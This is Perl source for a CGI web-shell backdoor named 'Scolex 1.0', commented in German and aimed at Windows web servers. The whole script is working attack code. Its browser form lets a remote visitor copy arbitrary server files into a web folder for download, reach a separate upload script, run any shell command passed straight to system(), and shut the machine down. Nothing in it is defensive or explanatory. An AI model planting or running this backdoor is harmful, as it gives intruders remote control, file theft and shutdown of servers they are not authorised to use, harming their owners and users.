   #Scolex 1.0 - CGI Backdoor

   #Variablen (bei bedarf ändern)

   $name = "bd.cgi"; #Name dieses Scripts
   $uploadname = "ul.cgi"; #Name des Uploadscripts
   $rootfolder = "../root/";
   $pos = "c:\\httpd\\cgi-bin\\"; #Pfad zu diesem Script

   #Code (nicht verändern)

   &parse_form;

   if ($in{art} eq "") {

           print "Content-Type: text/html\n\n";
           print "<html><head><title>Commands</title></head>";
           print "<body><font size=\"2\" face=\"Verdana, Arial\">";
           print "<form action=\"$name\" method=\"POST\">";
           print "<INPUT NAME=\"art\" TYPE=\"RADIO\" ALIGN=left VALUE=\"1\">1: Datei Runterladen: Pfad: <input name=\"filepfad\" type=\"text\" value=\"c:\\WINNT\\\"> Dateiname: <input name=\"filename\" type=\"text\" value=\"explorer.exe\">";
         print "<br><INPUT NAME=\"art\" TYPE=\"RADIO\" ALIGN=left VALUE=\"2\">2: Datei Uploaden";
           print "<br><INPUT NAME=\"art\" TYPE=\"RADIO\" ALIGN=left VALUE=\"3\">3: Dos Commando ausführen: <input name=\"cmd\" type=\"text\" value=\"dir \\\">";
         print "<br><INPUT NAME=\"art\" TYPE=\"RADIO\" ALIGN=left VALUE=\"4\">4: Computer Herunterfahren";
         print "<br><br><INPUT TYPE=\"SUBMIT\" VALUE=\"Senden\">";
           print "</form></font></body></html>";

   }

   elsif ($in{art} eq "1") {

       $pfad = "$in{filepfad}$in{filename}";
       open(DATEI, $pfad);
         @inhalt=<DATEI>;
       close(DATEI);

       $pfad = "$rootfolder$in{filename}";

       open(DATEI, ">$pfad");
       foreach $zeile (@inhalt) {
         print DATEI "$zeile\n";
       }

         print "Content-Type: text/html\n\n";
           print "<html><head><title>Datei Runterladen</title></head>";
           print "<body><font size=\"2\" face=\"Verdana, Arial\">";
           print "Die Datei $in{filename} wurde <a href=\"../$in{filename}\">hier</a> zum download freigegeben.";
           print "</font></form></body></html>";
   }

   elsif ($in{art} eq "2") {

       print "Content-Type: text/html\n\n";
       print "<html><head><title>Datei auswählen</title></head><body>Datei auswählen:<br>";
       print "<form name=\"Upload\" action=\"$uploadname\" method=\"POST\" enctype=\"multipart/form-data\"> <input type=\"file\" name=\"Datei\" size=\"30\"> <input type=\"submit\" value=\"Upload starten\"> </form>";
       print "</body></html>";

   }

   elsif ($in{art} eq "3") {
         print "Content-Type: text/html\n\n";
         print "<html><head><title>DOS Rückgabe</title></head><body><pre>";
         system ("$in{cmd}");
         print "</pre></body></html>";
   }

   elsif ($in{art} eq "4") {
         print "Content-Type: text/html\n\n";
         system ("c:\\winnt\\system32\\rundll32.exe shell32,SHExitWindowsEx 2");
   }

   sub parse_form {

       local ($buffer, @pairs, $pair, $name, $value);
       # Read in text
       $ENV{'REQUEST_METHOD'} =~ tr/a-z/A-Z/;
       if ($ENV{'REQUEST_METHOD'} eq "POST")
       {
           read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
       }
       else
       {
           $buffer = $ENV{'QUERY_STRING'};
       }
       @pairs = split(/&/, $buffer);
       foreach $pair (@pairs)
       {
           ($name, $value) = split(/=/, $pair);
           $value =~ tr/+/ /;
           $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
           $in{$name} = $value;
       }
   }
